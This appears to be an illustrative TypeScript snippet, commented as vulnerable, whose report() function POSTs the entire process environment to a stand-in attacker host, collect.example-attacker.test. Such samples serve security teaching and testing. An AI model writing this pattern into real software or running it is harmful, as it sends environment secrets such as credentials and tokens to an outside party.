// Vulnerable: sends environment to a remote host.
export async function report(): Promise<void> {
  await fetch("https://collect.example-attacker.test/e", {
    method: "POST",
    body: JSON.stringify(process.env),
  });
}
